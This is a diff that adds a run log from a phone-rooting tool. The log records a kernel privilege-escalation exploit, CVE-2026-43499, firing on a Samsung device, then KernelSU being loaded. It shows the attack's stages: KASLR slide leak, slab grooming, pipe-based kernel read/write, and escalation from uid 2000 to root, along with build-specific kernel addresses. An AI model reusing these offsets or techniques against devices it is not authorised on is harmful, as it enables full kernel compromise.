@@ -1,0 +1,86 @@
+◆ RootMyS24 启动中
+◆ 载荷: cve-2026-43499 (修正版, kmalloc_caches 0x176cbb8)
+[1/5] 检查 Shizuku...
+✔ Shizuku 就绪
+[2/5] 推送载荷到 /data/local/tmp ...
+✔ 推送完成 (cve-2026-43499=104128B, cve-2026-43499-root=27072B)
+◆ 诊断: pipe-max-size=? pipe-user-pages=cat: /proc/sys/fs/pipe-user-pages-soft: Permission denied
+cat: /proc/sys/fs/pipe-user-pages-hard: Permission denied
+n/a
+◆ 诊断: /proc/version=Linux version 6.1.145-android14-11-3254743-abS9280ZCS6DZF2 (build-user@build-host) (Android (10087095, +pgo, +bolt, +lto, -mlgo, based on r487747c) clang version 17.0.2 (https://android.googlesource.c
+[2.6/5] 清理残留 exploit 进程与临时文件 ...
+✔ 环境清理完成 (exit=137)
+[3/5] 触发 CVE-2026-43499 (LD_PRELOAD /system/bin/true) ...
+◆ 已自动熄屏（运行完成后将唤醒；可手动按电源键随时查看）
+[*] waiting for boot allocator quiet window seconds=64 uptime=56
+[+] preload supervisor pid=12953 attempts=30 base_delay=20000 p0_timeout=45 timeout=120
+[+] exploit attempt=1/30 pid=18763 delay=50000 p0_offset=scan
+[+] startup context pid=18763 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=18763 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=18763 label=e3q-S9280ZCS6DZF2-app-physical-p0-oracle slide=pselect main=pselect
+[+] p0 profile pid=18763 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff80296a61b8 bootid_data=ffffff802a3762f0 init_task=ffffff802a24f8c0 root_tg=ffffff802a44cd80 sysctl_bootid=ffffff802a6046e8
+[+] slide tracefs pre-oracle base=ffffffc0080a0000 slide=000a0000
+[+] slide-kaslr-ok source=tracefs pid=18763 base=ffffffc0080a0000 slide=00000000000a0000
+[*] fresh physrw pipe page=ffffff803fa38000
+[*] mm leaked=ffffff89fa964800 base=ffffff89fa960000 object_index=18
+[*] S928 bank bucket=18 lock=0x56a0 task=0x1000 mode=0
+[*] mm target-neighbor slab queued for late drain
+[*] mm late cpu-partial drain triggers=32
+[*] sk_buff reclaim sends=16/16 mode=0
+[*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=11981 base=ffffff89fa960000
+[*] app fops slide route parent=ffffff89fa961180 target=ffffff802a45b5b0 lock=ffffff89fa964820 delay=70000
+[+] slide child context route=pselect pid=29123 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[*] app fops slide attempt=1/1 triggered=0 verified=0 step=0 errno=0
+[+] pipe-physrw-summary pid=18763 done=0 root=0 kaslr=1 base=ffffffc0080a0000 slide=00000000000a0000
+[+] pipe physrw pid=18763 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295
+[+] supervisor retained p0_offset=0xa0000 gate=0x0 probe=0x0
+[-] exploit attempt=1/30 failed status=1
+[*] safe retry quiet delay seconds=5
+[+] exploit attempt=2/30 pid=29171 delay=50000 p0_offset=0xa0000
+[+] startup context pid=29171 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=29171 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=29171 label=e3q-S9280ZCS6DZF2-app-physical-p0-oracle slide=pselect main=pselect
+[+] p0 profile pid=29171 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff80296a61b8 bootid_data=ffffff802a3762f0 init_task=ffffff802a24f8c0 root_tg=ffffff802a44cd80 sysctl_bootid=ffffff802a6046e8
+[*] slide forced p0 offset=000a0000
+[+] slide-kaslr-ok source=forced pid=29171 base=ffffffc0080a0000 slide=00000000000a0000
+[*] fresh physrw pipe page=ffffff89875c8000
+[*] mm leaked=ffffff8a6b6dc400 base=ffffff8a6b6d8000 object_index=17
+[*] S928 bank bucket=17 lock=0x52a0 task=0x1000 mode=0
+[*] mm target-neighbor slab queued for late drain
+[*] mm late cpu-partial drain triggers=32
+[*] sk_buff reclaim sends=16/16 mode=0
+[*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=9483 base=ffffff8a6b6d8000
+[*] app fops slide route parent=ffffff8a6b6d9180 target=ffffff802a45b5b0 lock=ffffff8a6b6dc420 delay=70000
+[+] slide child context route=pselect pid=10299 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[*] stage=verifying-kernel-access
+[*] cfi write ret=35 errno=0
+[*] cfi read ret=35 errno=0
+[*] cfi restoring misc_fops target=ffffff802a45b5b0 value=ffffffc009471140
+[*] cfi starting pipe physrw
+[*] pipe caches normal1k=ffffff8001cf6700 normal2k=ffffff8001cf6800 cgroup1k=ffffff8001cf7000 cgroup2k=ffffff8001cf7100 selected=ffffff8001cf7100
+[*] pipe page idx=0 page=ffffff89875c8000 head=fffffffe261d7200 cache08=0000000000000000 cache10=dead000000000122 cache18=ffffff8001cf6800 cache20=0000000000000000 type=ffffffff match=1
+[*] phys step pipe probe found=1 pipebuf=ffffff89875c8000 idx=90 scan=1/1/1
+[*] phys step probed read done ok=1 idx=90
+[*] phys step probed write done ok=1
+[*] phys step read64 done ok=1 value=306365737562656e
+[*] root direct start uid=2000 fd=3
+[*] root umh queued wq=ffffff8001cf9400 pwq=ffffff8800b0ac00 pool=ffffff80629f0000 work=ffffff8a6b6de000 entry=ffffff8a6b6de008 color=0 counters=0/0/2 writes=1/1/1/1/1
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[*] root p0 reference holder ready=0
+[*] root p0 reference holder absent after parity physical handoff; bootstrap socket remains authoritative
+[*] app fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0
+[+] pipe-physrw-summary pid=29171 done=1 root=1 kaslr=1 base=ffffffc0080a0000 slide=00000000000a0000
+[+] pipe physrw pid=29171 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] stability keeper pid=10314 retaining reclaimed kernel pages
+[+] exploit completed attempt=2/30
+✔ 临时 root 已获得！
+[4/5] KernelSU late-load (经 root 守护进程) ...
+◆ 提示: 运行期间建议熄屏（减少显示驱动 work，降低内核竞态概率）
+✔ ksud 已暂存到 ksud-s25u-kdp / .ksud-stage
+ksud late-load: exit=0
+✔ KernelSU 驱动已加载 (late-load exit=0)
+[5/5] 验证...
+root 守护进程:
+✔ 请安装 KernelSU 管理器 (me.weishu.kernelsu v3.2.5, versionCode 32525) 后即可管理 root / 安装模块
+🎉 Root 流程完成！
+◆ 已唤醒屏幕
